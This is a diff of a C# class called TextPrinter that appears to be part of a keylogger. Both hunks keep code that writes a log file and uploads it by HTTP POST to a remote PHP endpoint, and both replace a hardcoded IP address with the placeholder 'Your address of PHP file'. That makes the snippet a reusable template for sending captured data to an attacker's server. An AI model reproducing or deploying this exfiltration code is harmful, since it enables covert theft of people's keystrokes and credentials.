@@ -34,7 +34,7 @@ public class TextPrinter
             count = 0;
             System.Net.WebClient Client = new System.Net.WebClient();
             Client.Headers.Add("Content-Type", "binary/octet-stream");
-            byte[] result = Client.UploadFile("http://103.17.75.26/key_index.php", "POST",
+            byte[] result = Client.UploadFile("Your address of PHP file", "POST",
                                               path);
             string s = System.Text.Encoding.UTF8.GetString(result, 0, result.Length);
 
@@ -47,7 +47,7 @@ public class TextPrinter
         textWriter.Close();
         System.Net.WebClient Client = new System.Net.WebClient();
         Client.Headers.Add("Content-Type", "binary/octet-stream");
-        byte[] result = Client.UploadFile("http://103.17.75.26/key_index.php", "POST",
+        byte[] result = Client.UploadFile("Your address of php file", "POST",
                                           path);
     }
 }
